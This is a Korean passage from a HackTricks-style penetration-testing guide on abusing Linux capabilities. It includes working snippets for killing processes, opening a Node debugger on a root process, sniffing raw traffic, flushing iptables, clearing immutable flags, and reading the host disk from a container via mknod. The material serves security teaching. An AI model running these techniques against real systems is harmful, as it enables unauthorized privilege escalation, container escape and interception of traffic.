상속 가능한 집합에는 bounding 집합에서만 기능을 추가할 수 있다는 것을 의미합니다. 즉, **CAP\_SYS\_ADMIN 또는 CAP\_SYS\_PTRACE와 같은 새로운 기능을 상속 집합에 추가하여 권한 상승을 할 수는 없습니다**.

## CAP\_SYS\_RAWIO

[**CAP\_SYS\_RAWIO**](https://man7.org/linux/man-pages/man7/capabilities.7.html)는 `/dev/mem`, `/dev/kmem` 또는 `/proc/kcore`에 대한 액세스, `mmap_min_addr` 수정, `ioperm(2)` 및 `iopl(2)` 시스템 호출 액세스, 그리고 다양한 디스크 명령을 포함한 여러 민감한 작업을 제공합니다. 이 기능을 통해 `FIBMAP ioctl(2)`도 활성화되며, 이로 인해 [과거에 문제가 발생](http://lkml.iu.edu/hypermail/linux/kernel/9907.0/0132.html)한 적이 있습니다. 매뉴얼 페이지에 따르면, 이 기능은 홀더가 다른 장치에 대해 기기별 작업을 수행할 수 있도록 합니다.

이는 **권한 상승**과 **Docker 탈출**에 유용할 수 있습니다.

## CAP\_KILL

**이는 어떤 프로세스든 종료할 수 있는 가능성을 의미합니다.**

**바이너리 예제**

예를 들어, **`python`** 바이너리가 이 기능을 가지고 있다고 가정해 봅시다. 만약 **일부 서비스 또는 소켓 구성**(또는 서비스와 관련된 구성 파일) 파일을 수정할 수 있다면, 해당 서비스와 관련된 프로세스를 백도어로 만들고, 해당 서비스의 새로운 구성 파일이 실행될 때까지 해당 프로세스를 종료할 수 있습니다.
```python
#Use this python code to kill arbitrary processes
import os
import signal
pgid = os.getpgid(341)
os.killpg(pgid, signal.SIGKILL)
```
**kill을 사용한 권한 상승**

만약 kill 기능을 가지고 있고 **루트로 실행 중인 노드 프로그램** (또는 다른 사용자로 실행 중인)이 있다면, **신호 SIGUSR1**을 보내어 **노드 디버거를 열 수** 있으며, 여기에 연결할 수 있을 것입니다.
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
{% content-ref url="electron-cef-chromium-debugger-abuse.md" %}
[electron-cef-chromium-debugger-abuse.md](electron-cef-chromium-debugger-abuse.md)
{% endcontent-ref %}

​

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

​​​​​​​​​​​​[**RootedCON**](https://www.rootedcon.com/)은 **스페인**에서 가장 관련성 있는 사이버 보안 행사이며 **유럽**에서 가장 중요한 행사 중 하나입니다. **기술적인 지식을 촉진하는 미션**을 가지고 있는 이 회의는 모든 분야의 기술 및 사이버 보안 전문가들에게 열정적인 만남의 장입니다.

{% embed url="https://www.rootedcon.com/" %}

## CAP\_NET\_BIND\_SERVICE

**이는 어떤 포트에서든 (특권이 있는 포트에서도) 수신이 가능하다는 것을 의미합니다.** 이 능력을 통해 권한 상승은 직접적으로 할 수 없습니다.

**바이너리 예시**

만약 **`python`**이 이 능력을 가지고 있다면 어떤 포트에서든 수신할 수 있으며, 심지어 다른 포트로부터 연결도 가능합니다 (일부 서비스는 특정 권한 포트로부터의 연결을 요구합니다)

{% tabs %}
{% tab title="수신" %}
```python
import socket
s=socket.socket()
s.bind(('0.0.0.0', 80))
s.listen(1)
conn, addr = s.accept()
while True:
output = connection.recv(1024).strip();
print(output)
```
{% endtab %}

{% tab title="연결" %}
```python
import socket
s=socket.socket()
s.bind(('0.0.0.0',500))
s.connect(('10.10.10.10',500))
```
{% endtab %}
{% endtabs %}

## CAP\_NET\_RAW

[**CAP\_NET\_RAW**](https://man7.org/linux/man-pages/man7/capabilities.7.html) 기능은 프로세스가 **RAW 및 PACKET 소켓을 생성**할 수 있도록 허용하여 임의의 네트워크 패킷을 생성하고 전송할 수 있게 합니다. 이는 컨테이너화된 환경에서 패킷 스푸핑, 트래픽 주입 및 네트워크 접근 제어 우회와 같은 보안 위험을 야기할 수 있습니다. 악의적인 사용자는 이를 악용하여 컨테이너 라우팅을 방해하거나 호스트 네트워크 보안을 침해할 수 있으며, 특히 충분한 방화벽 보호 없이 이를 수행할 수 있습니다. 또한, **CAP_NET_RAW**는 특권이 있는 컨테이너가 RAW ICMP 요청을 통해 ping과 같은 작업을 지원하는 데 필수적입니다.

**이는 트래픽을 가로챌 수 있다는 것을 의미합니다.** 이 기능으로 직접적으로 권한을 상승시킬 수는 없습니다.

**바이너리 예제**

만약 **`tcpdump`** 바이너리가 이 기능을 가지고 있다면, 네트워크 정보를 캡처하는 데 사용할 수 있습니다.
```bash
getcap -r / 2>/dev/null
/usr/sbin/tcpdump = cap_net_raw+ep
```
**환경**이 이 권한을 제공하는 경우 **`tcpdump`**를 사용하여 트래픽을 스니핑할 수도 있습니다.

**바이너리 2로 예시**

다음 예제는 "**lo**" (**localhost**) 인터페이스의 트래픽을 가로채는 데 유용한 **`python2`** 코드입니다. 이 코드는 [https://attackdefense.pentesteracademy.com/](https://attackdefense.pentesteracademy.com)의 랩 "_The Basics: CAP-NET\_BIND + NET\_RAW_"에서 가져온 것입니다.
```python
import socket
import struct

flags=["NS","CWR","ECE","URG","ACK","PSH","RST","SYN","FIN"]

def getFlag(flag_value):
flag=""
for i in xrange(8,-1,-1):
if( flag_value & 1 <<i ):
flag= flag + flags[8-i] + ","
return flag[:-1]

s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(3))
s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 2**30)
s.bind(("lo",0x0003))

flag=""
count=0
while True:
frame=s.recv(4096)
ip_header=struct.unpack("!BBHHHBBH4s4s",frame[14:34])
proto=ip_header[6]
ip_header_size = (ip_header[0] & 0b1111) * 4
if(proto==6):
protocol="TCP"
tcp_header_packed = frame[ 14 + ip_header_size : 34 + ip_header_size]
tcp_header = struct.unpack("!HHLLHHHH", tcp_header_packed)
dst_port=tcp_header[0]
src_port=tcp_header[1]
flag=" FLAGS: "+getFlag(tcp_header[4])

elif(proto==17):
protocol="UDP"
udp_header_packed_ports = frame[ 14 + ip_header_size : 18 + ip_header_size]
udp_header_ports=struct.unpack("!HH",udp_header_packed_ports)
dst_port=udp_header[0]
src_port=udp_header[1]

if (proto == 17 or proto == 6):
print("Packet: " + str(count) + " Protocol: " + protocol + " Destination Port: " + str(dst_port) + " Source Port: " + str(src_port) + flag)
count=count+1
```
## CAP\_NET\_ADMIN + CAP\_NET\_RAW

[**CAP\_NET\_ADMIN**](https://man7.org/linux/man-pages/man7/capabilities.7.html) 기능은 홀더에게 **네트워크 구성을 변경하는 권한**을 부여합니다. 이는 방화벽 설정, 라우팅 테이블, 소켓 권한 및 노출된 네트워크 네임스페이스 내의 네트워크 인터페이스 설정을 변경하는 능력을 포함합니다. 또한 네임스페이스 간 패킷 스니핑을 가능하게 하는 **프로미스큐어스 모드**를 활성화할 수도 있습니다.

**바이너리 예시**

예를 들어, **파이썬 바이너리**에는 이러한 기능이 있습니다.
```python
#Dump iptables filter table rules
import iptc
import pprint
json=iptc.easy.dump_table('filter',ipv6=False)
pprint.pprint(json)

#Flush iptables filter table
import iptc
iptc.easy.flush_table('filter')
```
## CAP_LINUX_IMMUTABLE

**이는 inode 속성을 수정할 수 있다는 것을 의미합니다.** 이 능력으로는 권한 상승을 직접적으로 할 수는 없습니다.

**바이너리를 사용한 예시**

만약 파일이 변경 불가능한 상태이고 파이썬이 이 능력을 가지고 있다면, **변경 불가능한 속성을 제거하고 파일을 수정 가능하게 만들 수 있습니다:**
```python
#Check that the file is imutable
lsattr file.sh
----i---------e--- backup.sh
```

```python
#Pyhton code to allow modifications to the file
import fcntl
import os
import struct

FS_APPEND_FL = 0x00000020
FS_IOC_SETFLAGS = 0x40086602

fd = os.open('/path/to/file.sh', os.O_RDONLY)
f = struct.pack('i', FS_APPEND_FL)
fcntl.ioctl(fd, FS_IOC_SETFLAGS, f)

f=open("/path/to/file.sh",'a+')
f.write('New content for the file\n')
```
{% hint style="info" %}
일반적으로 이 불변 속성은 다음과 같이 설정하고 제거됩니다:
```bash
sudo chattr +i file.txt
sudo chattr -i file.txt
```
{% endhint %}

## CAP\_SYS\_CHROOT

[**CAP\_SYS\_CHROOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html)는 `chroot(2)` 시스템 호출을 실행할 수 있게 해주며, 알려진 취약점을 통해 `chroot(2)` 환경에서 탈출할 수 있는 가능성이 있습니다:

* [다양한 chroot 솔루션에서 탈출하는 방법](https://deepsec.net/docs/Slides/2015/Chw00t\_How\_To\_Break%20Out\_from\_Various\_Chroot\_Solutions\_-\_Bucsay\_Balazs.pdf)
* [chw00t: chroot 탈출 도구](https://github.com/earthquake/chw00t/)

## CAP\_SYS\_BOOT

[**CAP\_SYS\_BOOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html)은 시스템 재시작을 위한 `reboot(2)` 시스템 호출을 실행할 수 있게 해줄 뿐만 아니라, 특정 하드웨어 플랫폼에 맞춘 `LINUX_REBOOT_CMD_RESTART2`와 같은 특정 명령도 실행할 수 있게 해줍니다. 또한 Linux 3.17부터는 새로운 또는 서명된 크래시 커널을 로드하기 위해 `kexec_load(2)`와 `kexec_file_load(2)`를 사용할 수 있게 해줍니다.

## CAP\_SYSLOG

[**CAP\_SYSLOG**](https://man7.org/linux/man-pages/man7/capabilities.7.html)은 Linux 2.6.37에서 보다 포괄적인 **CAP_SYS_ADMIN**으로부터 분리되어 `syslog(2)` 호출을 사용할 수 있는 능력을 특별히 부여합니다. 이 능력은 `kptr_restrict` 설정이 1인 경우, `/proc` 및 유사한 인터페이스를 통해 커널 주소를 볼 수 있게 해줍니다. Linux 2.6.39부터는 `kptr_restrict`의 기본값이 0으로 설정되어 커널 주소가 노출되지만, 많은 배포판에서 보안상의 이유로 이 값을 1(주소를 uid 0 이외에서 숨김) 또는 2(항상 주소를 숨김)로 설정합니다.

또한, **CAP_SYSLOG**는 `dmesg_restrict`가 1로 설정된 경우 `dmesg` 출력에 접근할 수 있게 해줍니다. 이러한 변경에도 불구하고, **CAP_SYS_ADMIN**은 역사적인 선행 사례로 인해 `syslog` 작업을 수행할 수 있는 능력을 유지합니다.

## CAP\_MKNOD

[**CAP\_MKNOD**](https://man7.org/linux/man-pages/man7/capabilities.7.html)는 `mknod` 시스템 호출의 기능을 확장하여 일반 파일, FIFO(명명된 파이프) 또는 UNIX 도메인 소켓 외에도 특수 파일을 생성할 수 있게 해줍니다. 이는 다음과 같은 특수 파일의 생성을 허용합니다:

- **S_IFCHR**: 터미널과 같은 장치인 문자 특수 파일.
- **S_IFBLK**: 디스크와 같은 장치인 블록 특수 파일.

이 능력은 디바이스 파일을 생성해야 하는 프로세스에 필수적이며, 문자 또는 블록 장치를 통해 직접 하드웨어와 상호 작용할 수 있게 해줍니다.

이는 도커의 기본 능력입니다 ([https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19](https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19)).

이 능력은 다음 조건에서 호스트에서 권한 상승(전체 디스크 읽기를 통해)을 수행할 수 있습니다:

1. 호스트에 초기 액세스 권한이 있어야 합니다(비특권).
2. 컨테이너에 초기 액세스 권한이 있어야 합니다(특권(EUID 0) 및 유효한 `CAP_MKNOD`).
3. 호스트와 컨테이너는 동일한 사용자 네임스페이스를 공유해야 합니다.

**컨테이너에서 블록 장치를 생성하고 액세스하는 단계:**

1. **일반 사용자로서 호스트에서:**
- `id`를 사용하여 현재 사용자 ID를 확인합니다. 예: `uid=1000(standarduser)`.
- 대상 장치를 식별합니다. 예를 들어 `/dev/sdb`입니다.

2. **`root`로서 컨테이너 내부에서:**
```bash
# Create a block special file for the host device
mknod /dev/sdb b 8 16
# Set read and write permissions for the user and group
chmod 660 /dev/sdb
# Add the corresponding standard user present on the host
useradd -u 1000 standarduser
# Switch to the newly created user
su standarduser
```
3. **호스트로 돌아가기:**
```bash
# Locate the PID of the container process owned by "standarduser"
# This is an illustrative example; actual command might vary
ps aux | grep -i container_name | grep -i standarduser
# Assuming the found PID is 12345
# Access the container's filesystem and the special block device
head /proc/12345/root/dev/sdb
```
이 접근 방식은 공유된 사용자 네임스페이스와 장치에 설정된 권한을 이용하여 표준 사용자가 컨테이너를 통해 `/dev/sdb`에서 데이터에 접근하고 잠재적으로 읽을 수 있게 합니다.


### CAP\_SETPCAP

**CAP_SETPCAP**은 다른 프로세스의 **능력 집합을 변경**할 수 있는 프로세스에게 권한을 부여합니다. 이를 통해 효과적인, 상속 가능한 및 허용된 집합에서 능력을 추가하거나 제거할 수 있습니다. 그러나 프로세스는 자신의 허용된 집합에 있는 능력만 수정할 수 있으며, 다른 프로세스의 권한을 자신보다 높일 수 없도록 합니다. 최근의 커널 업데이트에서는 이러한 규칙을 강화하여 `CAP_SETPCAP`이 자신 또는 자손의 허용된 집합 내에서만 능력을 감소시킬 수 있도록 제한하였으며, 이를 통해 보안 위험을 완화하고자 합니다. 사용을 위해서는 효과적인 집합에 `CAP_SETPCAP`이 있어야 하며, 수정을 위해 `capset()`을 사용하여 대상 능력을 허용된 집합에 사용해야 합니다. 이는 `CAP_SETPCAP`의 핵심 기능과 제한 사항을 요약하며, 권한 관리와 보안 강화에서의 역할을 강조합니다.

**`CAP_SETPCAP`**은 프로세스가 다른 프로세스의 **능력 집합을 수정**할 수 있는 Linux 능력입니다. 이를 통해 다른 프로세스의 효과적인, 상속 가능한 및 허용된 능력 집합에서 능력을 추가하거나 제거할 수 있습니다. 그러나 이 능력은 사용에 일정한 제한이 있습니다.

`CAP_SETPCAP`을 가진 프로세스는 **자신의 허용된 능력 집합에 있는 능력만 부여하거나 제거**할 수 있습니다. 다시 말해, 프로세스는 자신이 가지고 있지 않은 능력을 다른 프로세스에 부여할 수 없습니다. 이 제한은 프로세스가 자신의 권한 수준을 초과하여 다른 프로세스의 권한을 상승시키는 것을 방지합니다.

또한 최근의 커널 버전에서는 `CAP_SETPCAP` 능력이 **더 제한적으로 변경**되었습니다. 이제 프로세스는 임의로 다른 프로세스의 능력 집합을 수정할 수 없습니다. 대신, **프로세스는 자신의 허용된 능력 집합 또는 자손의 허용된 능력 집합 내에서만 능력을 감소시킬 수 있습니다**. 이 변경은 능력과 관련된 잠재적인 보안 위험을 줄이기 위해 도입되었습니다.

`CAP_SETPCAP`을 효과적으로 사용하기 위해서는 효과적인 능력 집합에 해당 능력이 있어야 하며, 대상 능력은 허용된 능력 집합에 있어야 합니다. 그런 다음 `capset()` 시스템 호출을 사용하여 다른 프로세스의 능력 집합을 수정할 수 있습니다.

요약하면, `CAP_SETPCAP`은 프로세스가 다른 프로세스의 능력 집합을 수정할 수 있게 해주지만, 자신이 가지고 있지 않은 능력을 부여할 수는 없습니다. 또한 보안 문제로 인해 최근의 커널 버전에서는 자신의 허용된 능력 집합 또는 자손의 허용된 능력 집합에서 능력을 감소시키는 것만 허용하도록 기능이 제한되었습니다.

## 참고 자료

**이 예제들은** [**https://attackdefense.pentesteracademy.com/**](https://attackdefense.pentesteracademy.com) **의 일부 랩에서 가져온 것이므로, 이 권한 상승 기법을 연습하고 싶다면 해당 랩을 추천합니다.**

**기타 참고 자료**:

* [https://vulp3cula.gitbook.io/hackers-grimoire/post-exploitation/privesc-linux](https://vulp3cula.gitbook.io/hackers-grimoire/post-exploitation/privesc-linux)
* [https://www.schutzwerk.com/en/43/posts/linux\_container\_capabilities/#:\~:text=Inherited%20capabilities%3A%20A%20process%20can,a%20binary%2C%20e.g.%20using%20setcap%20.](https://www.schutzwerk.com/en/43/posts/linux\_container\_capabilities/)
* [https://linux-audit.com/linux-capabilities-101/](https://linux-audit.com/linux-capabilities-101/)
* [https://www.linuxjournal.com/article/5737](https://www.linuxjournal.com/article/5737)
* [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/excessive-capabilities#cap\_sys\_module](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/excessive-capabilities#cap\_sys\_module)
* [https://labs.withsecure.com/publications/abusing-the-access-to-mount-namespaces-through-procpidroot](https://labs.withsecure.com/publications/abusing-the-access-to-mount-namespaces-through-procpidroot)

​

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

[**RootedCON**](https://www.rootedcon.com/)은 **스페인**에서 가장 중요한 사이버 보안 행사 중 하나로, **기술적인 지식을 촉진**하기 위한 장으로 모든 분야의 기술 및 사이버 보안 전문가들의 열린 만남의 장입니다.

{% embed url="https://www.rootedcon.com/" %}

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 제로에서 영웅까지 AWS 해킹 배우기<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* HackTricks를 **PDF로 다운로드**하거나 **회사를 HackTricks에서 광고**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 구매하세요.
* 독점적인 [**NFT**](https://opensea.io/collection/the-peass-family) 컬렉션인 [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**을** 팔로우하세요.
* **HackTricks**와 **HackTricks Cloud** github 저장소에 PR을 제출하여 **자신의 해킹 기법을 공유**하세요.

</details>
